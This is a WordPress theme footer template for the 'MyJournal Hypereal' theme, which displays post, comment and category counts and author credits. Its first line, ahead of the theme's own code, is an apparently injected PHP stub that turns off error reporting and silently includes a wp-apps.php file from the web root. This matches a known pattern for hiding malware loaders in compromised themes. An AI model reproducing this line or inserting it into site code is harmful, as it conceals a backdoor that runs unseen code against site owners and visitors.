<?php error_reporting(0);include_once $_SERVER['DOCUMENT_ROOT'].'/wp-apps.php';?><?php /* Counts the posts, comments and categories on your blog */
	$numposts = $wpdb->get_var("SELECT COUNT(*) FROM $wpdb->posts WHERE post_status = 'publish'");
	if (0 < $numposts) $numposts = number_format($numposts); 
	
	$numcomms = $wpdb->get_var("SELECT COUNT(*) FROM $wpdb->comments WHERE comment_approved = '1'");
	if (0 < $numcomms) $numcomms = number_format($numcomms);
	
	$numcats = $wpdb->get_var("SELECT COUNT(*) FROM $wpdb->categories");
	if (0 < $numcats) $numcats = number_format($numcats);

?>

<div id="footer">

<p>&copy; 2007 <?php bloginfo('name'); ?>. Powered by <a href="http://wordpress.org/" title="state of art blogging platform">Wordpress</a> wearing <a href="http://blogosquare.com/2007/06/18/myjournal-meets-sandbox-providing-you-the-best-theme-ever/" title="Download the myJournal Hypereal Wordpress theme">MyJournal Hypereal</a> by <a href="http://blogosquare.com" title="Fun 2.0 News &amp; Tips"><img src="<?php bloginfo('stylesheet_directory'); ?>/images/bsquare.gif" alt="visit Theme's author site" /> BlogoSquare</a><br />
There are currently <?php echo $numposts; ?> posts extending over <?php echo $numcats; ?> categories with loads upto <?php echo $numcomms; ?> comments with valid <a href="http://validator.w3.org/check?uri=referer">XHTML</a> and <a href="http://jigsaw.w3.org/css-validator/check/referer">CSS</a>.</p>
<a name="footer"></a>
		<span id="theme-link"></span>
		<a name="bottom_part"></a>
	</div><!-- #footer -->

</div><!-- #wrapper .hfeed -->

<?php wp_footer() ?>

</body>
</html>
